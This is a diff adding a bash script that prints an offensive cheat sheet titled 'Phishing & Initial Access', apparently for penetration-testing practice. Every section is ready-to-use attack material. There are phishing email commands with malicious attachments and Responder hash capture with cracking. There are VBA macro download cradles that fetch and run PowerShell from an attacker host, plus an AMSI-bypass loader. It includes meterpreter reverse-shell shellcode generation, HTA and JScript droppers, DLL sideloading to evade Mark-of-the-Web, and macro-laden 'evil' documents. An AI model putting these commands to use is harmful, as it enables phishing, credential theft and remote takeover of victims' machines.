@@ -1,0 +1,73 @@
+#!/bin/bash
+BOLD='\033[1m'
+CYAN='\033[36m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+NC='\033[0m'
+
+printf "\n"
+echo -e "${BOLD}${YELLOW}── PHISHING & INITIAL ACCESS ─────────────────────────${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── ICS/Calendar Phishing ────────────────────────────${NC}"
+echo -e "  ${GREEN}sendEmail -s <SMTP_IP> -t victim@corp.com -f attacker@corp.com -u 'Urgent HR meeting' -o message-content-type=html -o message-file=./email.html -a iCalendar.ics${NC}"
+echo -e "  ${GREEN}swaks --to dave@corp.com --from attacker@corp.com -ap --attach config.Library-ms --server <SMTP_IP>:25 --header 'Subject: Info' --suppress-data${NC}"
+echo -e "  ${GREEN}sudo swaks -t target@domain.com --from hack@hack.com --server <HOST>:25 --body 'CV' --header Subject --attach @<attachfile>${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Capture Hash (Responder) ─────────────────────────${NC}"
+echo -e "  ${GREEN}sudo responder -I tun0${NC}                           # capture NTLMv2"
+echo -e "  ${GREEN}hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── VBA Macro — Download Cradle ──────────────────────${NC}"
+echo -e "  ${GREEN}Sub AutoOpen()${NC}"
+echo -e "  ${GREEN}    Shell \"powershell (New-Object System.Net.WebClient).DownloadString('http://<ATTACKER_IP>/run.ps1') | IEX\", vbHide${NC}"
+echo -e "  ${GREEN}End Sub${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── VBA Macro — WMI Exec ─────────────────────────────${NC}"
+echo -e "  ${GREEN}Sub MyMacro()${NC}"
+echo -e "  ${GREEN}    strArg = \"powershell -enc <B64_CMD>\"${NC}"
+echo -e "  ${GREEN}    GetObject(\"winmgmts:\").Get(\"Win32_Process\").Create strArg, Null, Null, pid${NC}"
+echo -e "  ${GREEN}End Sub${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── VBA Two-Stage (AMSI bypass first) ────────────────${NC}"
+echo -e "  ${GREEN}str = \"powershell.exe -nop -ep bypass -c IEX(New-Object System.Net.WebClient).Downloadstring('http://<KALI>/amsi.txt')\"${NC}"
+echo -e "  ${GREEN}Shell str, vbHide${NC}"
+echo -e "  ${GREEN}str = \"powershell.exe -nop -ep bypass -c IEX(New-Object System.Net.WebClient).Downloadstring('http://<KALI>/runner.txt')\"${NC}"
+echo -e "  ${GREEN}Shell str, vbHide${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── HTA Payload ──────────────────────────────────────${NC}"
+echo -e "  ${GREEN}msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=443 -e x64/xor_dynamic -b '\\x00\\x0a\\x0d' -f raw > rawsc.bin${NC}"
+echo -e "  ${GREEN}./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile rawsc.bin --payload js --output test${NC}"
+printf "\n"
+echo -e "  Note: HTA: embed test.js content inside <script language=\"JScript\">"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Jscript Dropper ──────────────────────────────────${NC}"
+echo -e "  Note: MSXML2.XMLHTTP + ADODB.Stream downloads binary to disk then executes"
+echo -e "  ${GREEN}var xhttp = new ActiveXObject(\"MSXML2.XMLHTTP\"); xhttp.open(\"GET\", url, false); xhttp.send();${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── DotNetToJscript ──────────────────────────────────${NC}"
+echo -e "  ${GREEN}DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js${NC}"
+echo -e "  ${GREEN}python2 SharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile /var/www/html/shell.txt --output test${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── DLL Sideloading (MotW Bypass) ────────────────────${NC}"
+echo -e "  ${GREEN}python perfect_dll_proxy.py secur32.dll${NC}"
+echo -e "  ${GREEN}attrib +h secur32.dll${NC}"
+echo -e "  ${GREEN}'C:\Program Files\7-Zip\7z.exe' a -tzip onedrive.zip .\\OneDrive.exe .\\secur32.dll${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── BadAssMacros ─────────────────────────────────────${NC}"
+echo -e "  ${GREEN}BadAssMacros.exe -i shellcode.bin -w doc -p no -s classic -c 5 -o evil.doc${NC}"
+echo -e "  ${GREEN}BadAssMacros.exe -i shellcode.bin -w excel -p no -s indirect -o evil.xlsx${NC}"
+printf "\n"
+
+printf "\n"
+echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
